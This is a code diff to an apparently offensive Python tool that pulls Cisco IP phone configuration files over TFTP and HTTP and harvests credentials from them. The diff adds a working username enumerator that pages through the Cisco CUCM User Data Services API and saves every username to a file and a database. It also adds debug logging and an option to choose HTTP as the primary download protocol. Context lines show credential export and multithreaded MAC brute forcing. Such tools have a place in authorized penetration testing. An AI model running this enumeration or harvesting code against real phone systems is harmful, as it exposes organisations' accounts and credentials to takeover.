@@ -20,14 +20,25 @@ from contextlib import redirect_stdout, redirect_stderr
 from bs4 import BeautifulSoup
 from alive_progress import alive_bar
 import tftpy
+import urllib3
+# CUCM ships self-signed certs by design; suppress the InsecureRequestWarning
+# spam that every requests.get(verify=False) call would otherwise emit.
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ...existing code...
 # Protocol ports
 # TFTP port is standard (69), HTTP_TFTP_PORT is configurable for fallback
 HTTP_TFTP_PORT = 6970
+# CUCM User Data Services (UDS) API — HTTPS only, default 8443
+UDS_PORT = 8443
 # Global variables
 debug = False
 found_credentials = []
 found_usernames = []
+
+
+def dbg(msg):
+    if globals().get('debug', False):
+        print(f'[DEBUG] {msg}', flush=True)
 file_names = ''
 hostnames = []
 db_file = 'thief.db'
@@ -160,13 +171,17 @@ def download_config_http(cucm_host, filename, timeout=5):
     if _TEST_MODE:
         return _TEST_CONFIG
 
+    url = f'http://{cucm_host}:{HTTP_TFTP_PORT}/{filename}'
+    dbg(f'HTTP GET {url} (timeout={timeout}s)')
     try:
-        url = f'http://{cucm_host}:{HTTP_TFTP_PORT}/{filename}'
         resp = requests.get(url, verify=False, timeout=timeout)
-        if re.match(r"^[2]\d\d$", str(resp.status_code)):
-            return resp.text
-    except Exception:
-        pass
+    except Exception as e:
+        dbg(f'HTTP {url} raised {type(e).__name__}: {e}')
+        return None
+    dbg(f'HTTP {url} -> {resp.status_code} ({len(resp.content)} bytes)')
+    if re.match(r"^[2]\d\d$", str(resp.status_code)):
+        return resp.text
+    dbg(f'HTTP {url} non-2xx body (first 200 chars): {resp.text[:200]!r}')
     return None
 
 
@@ -174,6 +189,7 @@ def download_config_tftp(cucm_host, filename, timeout=5, raise_on_error=False):
     if _TEST_MODE:
         return _TEST_CONFIG
 
+    dbg(f'TFTP GET tftp://{cucm_host}:69/{filename} (timeout={timeout}s)')
     tmp_path = None
     try:
         with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
@@ -181,8 +197,11 @@ def download_config_tftp(cucm_host, filename, timeout=5, raise_on_error=False):
         client = tftpy.TftpClient(cucm_host, 69)
         client.download(filename, tmp_path, timeout=timeout)
         with open(tmp_path, "r", errors="ignore") as handle:
-            return handle.read()
-    except Exception:
+            data = handle.read()
+        dbg(f'TFTP {cucm_host}/{filename} -> {len(data)} bytes')
+        return data
+    except Exception as e:
+        dbg(f'TFTP {cucm_host}/{filename} raised {type(e).__name__}: {e}')
         if raise_on_error:
             raise
         return None
@@ -347,15 +366,19 @@ def get_hostname_from_phone(phone_ip):
     if _TEST_MODE:
         return os.getenv("THIEF_TEST_PHONE_HOSTNAME") or "SEPTEST00000000"
 
+    url = f'http://{phone_ip}/NetworkConfiguration'
+    dbg(f'Phone hostname lookup: GET {url}')
     try:
-        url = f'http://{phone_ip}/NetworkConfiguration'
         resp = requests.get(url, verify=False, timeout=3)
-        match = re.search(r'Host\s+Name.*?<b>\s*([A-Za-z0-9]+)\s*</b>',
-                          resp.text, re.IGNORECASE | re.DOTALL)
-        if match:
-            return match.group(1)
-    except Exception:
-        pass
+    except Exception as e:
+        dbg(f'Phone {phone_ip} NetworkConfiguration raised {type(e).__name__}: {e}')
+        return None
+    dbg(f'Phone {phone_ip} NetworkConfiguration -> {resp.status_code} ({len(resp.content)} bytes)')
+    match = re.search(r'Host\s+Name.*?<b>\s*([A-Za-z0-9]+)\s*</b>',
+                      resp.text, re.IGNORECASE | re.DOTALL)
+    if match:
+        return match.group(1)
+    dbg(f'Phone {phone_ip}: "Host Name" pattern not found in NetworkConfiguration body')
     return None
 
 
@@ -373,12 +396,20 @@ def get_cucm_name_from_phone(phone_ip):
     if _TEST_MODE:
         return "mock-cucm"
 
+    url = f'http://{phone_ip}/NetworkConfiguration'
+    dbg(f'CUCM discovery: GET {url}')
     try:
-        url = f'http://{phone_ip}/NetworkConfiguration'
         resp = requests.get(url, verify=False, timeout=3)
-        return parse_cucm(resp.text)
-    except Exception:
+    except Exception as e:
+        dbg(f'CUCM discovery {phone_ip} raised {type(e).__name__}: {e}')
         return None
+    dbg(f'CUCM discovery {phone_ip} -> {resp.status_code} ({len(resp.content)} bytes)')
+    cucm = parse_cucm(resp.text)
+    if not cucm:
+        dbg(f'CUCM discovery {phone_ip}: no CUCM hostname matched in response body')
+    else:
+        dbg(f'CUCM discovery {phone_ip}: parsed CUCM = {cucm}')
+    return cucm
 
 
 def get_config_names(cucm_host, hostnames=None):
@@ -402,8 +433,74 @@ def get_config_names(cucm_host, hostnames=None):
     return []
 
 
-def get_users_api(cucm_host):
-    return []
+def get_users_api(cucm_host, port=UDS_PORT, timeout=10, max_pages=10000):
+    if _TEST_MODE:
+        return ['testuser1', 'testuser2']
+
+    base = f'https://{cucm_host}:{port}/cucm-uds/users'
+    users = []
+    seen_urls = set()
+    next_url = base
+    pages = 0
+    total = None
+
+    while next_url and pages < max_pages:
+        if next_url in seen_urls:
+            dbg(f'UDS pagination loop detected at {next_url}, stopping')
+            break
+        seen_urls.add(next_url)
+        pages += 1
+
+        dbg(f'UDS GET {next_url} (timeout={timeout}s)')
+        try:
+            resp = requests.get(next_url, verify=False, timeout=timeout)
+        except Exception as e:
+            dbg(f'UDS {next_url} raised {type(e).__name__}: {e}')
+            break
+        dbg(f'UDS {next_url} -> {resp.status_code} ({len(resp.content)} bytes)')
+        if resp.status_code != 200:
+            dbg(f'UDS non-200 body (first 300 chars): {resp.text[:300]!r}')
+            break
+
+        page_users = re.findall(r'<userName>([^<]+)</userName>', resp.text)
+        dbg(f'UDS page {pages} parsed {len(page_users)} userName entries')
+        if not page_users:
+            dbg(f'UDS empty page body (first 300 chars): {resp.text[:300]!r}')
+            break
+        users.extend(page_users)
+
+        if total is None:
+            total_match = re.search(r'<users\b[^>]*\btotalCount="(\d+)"', resp.text) \
+                or re.search(r'<totalCount>(\d+)</totalCount>', resp.text)
+            if total_match:
+                total = int(total_match.group(1))
+                dbg(f'UDS server reports totalCount={total}')
+
+        if total is not None and len(users) >= total:
+            break
+
+        next_url = _uds_next_link(resp.text, base, len(users) + 1)
+        if not next_url:
+            dbg('UDS no next-page link found; stopping pagination')
+            break
+
+    dbg(f'UDS total users collected: {len(users)} across {pages} page(s)')
+    if total is not None and len(users) < total:
+        print(f'[!] UDS reports {total} total users but only {len(users)} were retrieved.')
+    return users
+
+
+def _uds_next_link(body, base_url, fallback_start):
+    # HATEOAS variants seen in CUCM UDS responses
+    m = re.search(r'<link\b[^>]*\brel="next"[^>]*\bhref="([^"]+)"', body, re.IGNORECASE)
+    if m:
+        return m.group(1)
+    m = re.search(r'<next>([^<]+)</next>', body, re.IGNORECASE)
+    if m:
+        return m.group(1).strip()
+    # Fallback: try ?start=N (most common Cisco UDS pagination param)
+    sep = '&' if '?' in base_url else '?'
+    return f'{base_url}{sep}start={fallback_start}'
 
 
 def log_uds_usernames_to_db(cucm_host, usernames, db_file='thief.db'):
@@ -1120,6 +1217,8 @@ def main():
     parser.add_argument('-T','--threads', type=int, default=40, help='Number of worker threads for brute force mode (default: 40)')
     parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
     parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
+    parser.add_argument('--http', action='store_true', default=False, help='Use HTTP (port 6970) as the primary download protocol, with TFTP fallback (default: TFTP first, HTTP fallback)')
+    parser.add_argument('--uds-port', type=int, default=UDS_PORT, help=f'CUCM UDS API HTTPS port for --userenum (default: {UDS_PORT})')
     
     # Output Options
     parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
@@ -1190,7 +1289,7 @@ def main():
                 print('[-] No phones available. Exiting.')
                 quit(1)
     
-    use_tftp = True  # TFTP is default, with automatic HTTP fallback
+    use_tftp = not args.http  # TFTP is default; --http flips to HTTP-first with TFTP fallback
     
     # Set debug flag so worker threads can access it
     debug = args.debug
@@ -1248,6 +1347,31 @@ def main():
     configure_tftpy_logging(debug)
 
     get_version(CUCM_host)
+
+    if args.userenum:
+        if not CUCM_host:
+            print('--userenum requires -H/--host to specify the CUCM server')
+            quit(1)
+        print(f'Getting users from UDS API at https://{CUCM_host}:{args.uds_port}/cucm-uds/users')
+        api_users = get_users_api(CUCM_host, port=args.uds_port)
+        if api_users:
+            unique_users = list(set(api_users))
+            with open(outfile, mode='w') as outputfile:
+                for line in unique_users:
+                    outputfile.write(line + '\n')
+            if not no_db:
+                if log_uds_usernames_to_db(CUCM_host, unique_users, db_file):
+                    print(f'[+] Logged {len(unique_users)} UDS API usernames to database')
+                else:
+                    print(f'[-] Failed to log UDS API usernames to database')
+            print(f'The following {len(unique_users)} users were identified from the UDS API')
+            print(f'[*] Usernames written to: {outfile}')
+            if debug:
+                for username in unique_users:
+                    print(f'{username}')
+        else:
+            print('[-] No users returned from UDS API. Re-run with -d for request/response details.')
+        quit(0)
 
     # Handle MAC brute forcing from detected phones
     if brute_mac:
@@ -1870,32 +1994,6 @@ def main():
             if debug:
                 print(f'[DEBUG] log_credentials_to_db returned: {result}')
         quit(0)
-    if args.userenum:
-        print('Getting users from UDS API.')
-        #each API call is limited by default to 64 users per request
-        api_users = get_users_api(CUCM_host)
-        if api_users != []:
-            unique_users = set(api_users)
-            api_users = list(unique_users)
-            
-            # Write to output file
-            with open(outfile, mode='w') as outputfile:
-                for line in api_users:
-                    outputfile.write(line+'\n')
-            
-            # Log to database unless --no-db flag is set
-            if not no_db:
-                if log_uds_usernames_to_db(CUCM_host, api_users, db_file):
-                    print(f'[+] Logged {len(api_users)} UDS API usernames to database')
-                else:
-                    print(f'[-] Failed to log UDS API usernames to database')
-            
-            print(f'The following {len(api_users)} users were identified from the UDS API')
-            print(f'[*] Usernames written to: {outfile}')
-            if debug:
-                for username in api_users:
-                    print('{0}'.format(username))
-
 
 if __name__ == '__main__':
     main()
